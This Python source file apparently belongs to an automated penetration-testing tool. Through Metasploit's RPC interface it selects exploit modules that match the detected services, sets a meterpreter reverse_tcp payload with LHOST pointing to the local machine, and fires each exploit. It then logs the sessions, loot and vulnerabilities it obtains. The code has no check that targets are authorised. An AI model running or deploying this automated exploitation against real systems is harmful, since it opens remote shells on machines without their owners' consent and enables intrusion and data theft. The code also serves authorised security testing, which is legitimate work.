from msfreportmanager import MsfReportManager
from pymetasploit3.msfrpc import MsfRpcClient

class ExploitManager(object):
    def __init__(self, client_conosle, output_filename, detected_services):
        self.msfreporter = MsfReportManager("exploits_"+ output_filename)
        self.client_console = client_conosle
        self.services = detected_services
        self.host_ip = self._get_host_ip(self.client_console)

    def run_exploits(self):
        try:
            exploit_modules = self._get_nonbruteforce_exploit_modules(self.client_console.get_client()) #TODO change into exploit modules    
            final_module_list = self._filter_modules_by_services(exploit_modules, "exploit", self.client_console)
            self._try_modules(final_module_list)

            sessions = self.client_console.get_command_response("sessions")
            print(sessions)
            self.msfreporter.add_to_report("Sessions created", sessions)

            jobs = self.client_console.get_command_response("jobs")
            print(jobs)
            self.msfreporter.add_to_report("Jobs started", jobs)

            loot = self.client_console.get_command_response("loot")
            print (loot)
            self.msfreporter.add_to_report("Loots", loot)

            vulns = self.client_console.get_command_response("vulns")
            print(vulns)
            self.msfreporter.add_to_report("Vulnerabilities", vulns)
            
            self.msfreporter.output_json_report()
        except Exception as identifier:
            print(identifier)

    def _try_modules(self, module_list):
        
        if (len(module_list)>0):
            for module in module_list:
                print(self.client_console.get_module_options(module)) #Use module
                self._set_module_payload(module, self.client_console) #Set payload
                self._set_lhost(self.client_console)                  #Set lhost
                module_usable_without_user = self._check_module_usability(module, self.client_console) #doublecheck
                if (module_usable_without_user):
                    print("Currently trying to run {0} module. Please wait untill it has finished with execution".format(module))
                    response = self.client_console.get_command_response("exploit")
                    self.msfreporter.add_to_report(module, response) 

    def _check_module_usability(self, module, client_console):
        module_options = client_console.get_module_options(module)
        if (module_options != ''):
            module_option_rows = module_options.splitlines()
            module_usable = self._all_required_settings_configured(module_option_rows)
            return module_usable 

    def _all_required_settings_configured(self, module_options):
        for row in module_options[5:]: #TODO from 5th position to index of ''x2 or Exploit target
            if (row != ''):
                words = row.split()
                if (len(words) > 3 and words[1] == "yes" and words[2]!= "yes"): 
            #If the row is split by spaces/tabs and current setting is empty yes will be on index 1 instead of 2
            #That means that a required setting is not set up and module can't be used
                    return False 
        return True                    

    def _get_nonbruteforce_exploit_modules(self, client):
        """
        Returns a dictionary of non-bruteforce modules of desired type and their descriptions
        """
        print("Selection of potential exploit modules, this could take a while..")

        exploit_modules = client.modules.exploits
        final_modules = {}
        for module in exploit_modules:
            try:
                module_info = self._get_module_description(module, client)
                if ("bruteforc" not in module_info and "brute forc" not in module_info): #Filter out some bruteforce modules
                    final_modules[module] = module_info
            except Exception as identifier:
                print(identifier)
                
        print("The initial list of all availabe non-bruteforce exploit modules compiled.")
        return final_modules

    def _filter_modules_by_services(self, modules, desired_module_type, client_console):
        filtered_scanner_modules = self._filter_modules_by_service_name(modules)
        return self._filter_modules_by_service_info(filtered_scanner_modules, desired_module_type, client_console)

    def _filter_modules_by_service_name(self, modules):
        print("Filtering possible exploits by detected service names")
        final_modules = []
        for module_key in modules.keys(): 
            for service_key in self.services.keys(): 
                if (service_key in module_key and service_key in modules[module_key]): #if service name is in module 
                    final_modules.append(module_key)
        return final_modules

    def _filter_modules_by_service_info(self, list_of_possible_modules, desired_module_type, client_console):
        print("Filtering possible exploits by detected service info")
        module_list = set()
        for service_key in self.services.keys():
            if(self.services[service_key] != ''):
                search_response = client_console.search_msf_modules(self.services[service_key])
                response_modules = self._parse_search_response(search_response, desired_module_type)
                module_list.update(response_modules)    
        possbile_modules = set(list_of_possible_modules)
        print("Creating a list of exploits that are most-likely to be fitting to target the detected services")
        result_list = possbile_modules.intersection(module_list)
        return result_list

    def _parse_search_response(self, response, module_type):
        module_names = []
        if (response != ''):
            rows = response.splitlines()
            for row in rows[6:(len(rows)-2)]:
                columns = row.split()
                if (len(columns)>2 and columns[1] != '' and columns[1] not in module_names and module_type in columns[1]):
                    module_name = columns[1]
                    position = len(module_type)+1 # crop the auxiliary, exploit or other module group names
                    module_names.append(module_name[position:])
        if (len(module_names)>15):
            return module_names[:10] #TODO if there are more than 10 outputs remove the rest. 
        else:
            return module_names
        
    def _get_module_description(self, module, client):
        temporary_module = client.modules.use("exploit", module)
        module_info = temporary_module.description
        return module_info

    def _set_module_payload(self, module, client):
        module_object = client.get_client().modules.use("exploit", module)
        possible_payloads = module_object.targetpayloads()
        selected_payload = self._select_payload(possible_payloads)
        if selected_payload is not None:
            command = "set payload "+ selected_payload
            print(client.get_command_response("show options"))
            response = client.get_command_response(command)
            print (response)

    def _select_payload(self, payload_list):
        if (len(payload_list)>0):
            #TODO select meterpreter reverse tcp if available
            for payload in payload_list:
                if "/meterpreter/reverse_tcp" in payload:
                    return payload
            for payload in payload_list:
                if "reverse_tcp" in payload:
                    return payload
            return payload_list[0] #TODO maybe use smarter payload selection, based on target host os from services or hosts report
        else:
            return None

    def _set_lhost(self, client):
        command = "set LHOST "+self.host_ip
        response = client.get_command_response(command)
        print (response)

    def _get_host_ip(self, client):
        command = "hostname -I | awk '{print $1}'"
        response = client.get_command_response(command)
        if (response != ''):
            lines = response.splitlines()
            if lines[2] is not None:
                pass
                return lines[2]
        return "127.0.0.1"